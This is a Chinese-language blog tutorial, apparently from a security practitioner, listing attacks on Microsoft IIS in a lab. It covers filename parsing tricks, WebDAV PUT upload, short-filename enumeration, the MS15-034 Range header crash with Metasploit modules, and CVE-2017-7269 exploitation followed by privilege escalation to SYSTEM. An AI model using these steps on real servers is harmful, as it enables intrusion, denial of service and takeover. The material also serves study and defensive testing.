> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8Ka6TGw5aZol3EIClPJkqw)

前言：生而为人，我很狼狈。

**0x00 解析漏洞**

**1、****iis6.x 解析漏洞**

原理：是服务器默认不解析; 号及其后面的内容。

三种方式，以文件名、文件夹和默认的扩展名。

文件名：*.asp;.jpg，png、gif、xml 的也可以。*.asp;.*。以此命名 *.asp;.jpg 会当作是 asp 运行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3nGCIBzmibzTVqoT0sIVmLX6eJIqJVL2t0icvXp95VfcHlB7CYNs8uqibg/640?wx_fmt=png)文件夹：默认会将 *.asp / 目录下的所有文件当成 Asp 解析

```
http://192.168.52.136/test.asp/2.xxxx
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3PZia5OIFjkhxxSr8exedndrIDx5yPYic5nxd7bj83unYLvSRUZLnqn8w/640?wx_fmt=png)

扩展名：默认会将扩展名为. asa，.cdx，.cer 解析为 asp。从网站属性 -> 主目录 -> 配置

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3tt2A4XG7udUiaMjo1v1K8liauDibWhfp99tbibVdLILY3LtIU3WcszsIqw/640?wx_fmt=png)**2、****iis 7.x 解析漏洞**

IIS7.x 版本在 Fast-CGI 运行模式下, 在任意文件，例：test.jpg 后面加上 /.php，会将 test.jpg 解析为 php 文件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3pVq7TPWQTicDRkicKFgJTKUhqibUyDGTHmbpcYRjnubwbSu7JurDebybw/640?wx_fmt=png)

0x01 PUT 文件上传

IIS Server 在 Web 服务扩展中开启了 WebDAV 之后，支持多种请求，配合写入权限，可造成任意文件写入。

未开启的状态  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3fIJxJam13DJvHjYTASs1ytyGtthPrvQ1W1K96ibWBJxOFVEwRxks1Qg/640?wx_fmt=png)

开启的状态  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF37aibEOqctZP1Mq6v3nibIiaXhxPTIAlmhMBtZedIr6bhVWdvYfQ5hxjFg/640?wx_fmt=png)

上传

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF396sVkddwkzh7NUGG02cNgicYS0rAyUX7EbvicnnDxsVHZNaAJ6vkqIcw/640?wx_fmt=png)

满足条件，开启 webdav，有写入的权限，两个位置，来宾对文件夹的权限，

以及网站属性下的权限。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3xF4g75yD9Peuicxwye9C66hMT8n0BULEOrALqPXRHLeausicAl49GuLg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3mTJ0UGWQpVlofoXSvL57SAZIklNVic64MCYrOW8PDx6fBN7c9PwIQBg/640?wx_fmt=png)0x02 短文件漏洞

IIS 短文件名产生：

```
2.当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。
1.当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。
```

命令查看 dir /x  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3nwfe0RoQDeHsuLPCpEytW9LaP1Mm7RD620ic2wahHBeEt22fIQUv4ow/640?wx_fmt=png)访问构造的某个存在的短文件名，会返回 404![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3HKCT6x40iamhhbJJ8N4s23libuxeK2kEOjPeWXlGydcI9jvvqdLGc6bg/640?wx_fmt=png)

访问构造的某个不存在的短文件名，会返回 400![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3D2rUlEtp6p0CicyicuQAcVJXz7pgNMMejlNsibbnamsxeibxCt9d59Z6Vw/640?wx_fmt=png)

缺陷：用来爆破文件名，但超过 6 的很难爆到，并且有. 会被认为是文件夹，而且不支持中文。  

工具利用：

```
java8 -jar iis_shortname_scanner.jar 2 20 http://192.168.52.136/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3Q2zjHJ3rDgZd8Hlial9iagicxvMic9ib8FuzGgBclru3L3hHlYSzrunnMJQ/640?wx_fmt=png)

0x03 HTTP.SYS 远程代码执行远程代码执行 (MS15-034)

编辑请求头，增加 Range: bytes=0-18446744073709551615 字段，若返回码状态为 416 Requested Range Not Satisfiable，则存在 HTTP.SYS 远程代码执行漏洞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3JH1ypaz1zjv0yfO0S6JC1XxAtVdicKjRIsDYahGmH3LAJr86icVzP65A/640?wx_fmt=png)

msf 检测

```
use auxiliary/dos/http/ms15_034_ulonglongadd
set rhosts 192.168.52.134
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3ZdtEHszW0ibCM9czOMIuvudxmx0YnC6Xr2vvHe24VXIh3BaickibIfkiaA/640?wx_fmt=png)msf 打蓝屏

```
use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
set rhosts 192.168.52.134
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3ZhYo7LM97HiaKYfibib1dibu309I0mWSeCCFq0DJDiaH6iaU3qfyicOntBLdw/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3VeMG0NronyZK1huKH49icN4FufDY5x749XjYnC9HEaUYY0RUgMbsGjw/640?wx_fmt=png)0x04 RCE-CVE-2017-7269

使用 msf

```
use exploit/windows/iis/cve_2017_7269
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3dlHYovsJwsI6QjFX2JawHic0ESvTAqtkHqbTw3Lo6QFKT54VuBXIy6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3aCdLbs8aQCyMfDKiaFhMVlJa1C0icJOlvdBR9FH8NKjRP600GRnZYdsw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3bfOSUnHz6asTNA38s58xJ0ia9oZfOECHvRIgias7fKjBC3vFYNlCf9uQ/640?wx_fmt=png)

发现是普通用户  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3QR8icrTWOfz4LwP85PMia4N3rRNVn6VZ7kvjmKN53lAjThPHKFMTJbzA/640?wx_fmt=png)

上传提权 exe

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF36smiab5zRiaX8I1kyfEIUQsZ3crY8EMX8icsc9hueGx6oTzoRrP0NSTCw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3VRx8fiaQJ3pEE8ntbrxO2DwJSEHThp59ODE2GOa6iaAJhEHiaXrw2uJtg/640?wx_fmt=png)

最后提权 system

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEdvtYR5JaaySXwg6kic6z4scoNYcWrF3Hicopt9NZeyJlpsIicyzSShYBc1BRpeWA27IROeUaeW3T2azslzqLZnA/640?wx_fmt=png)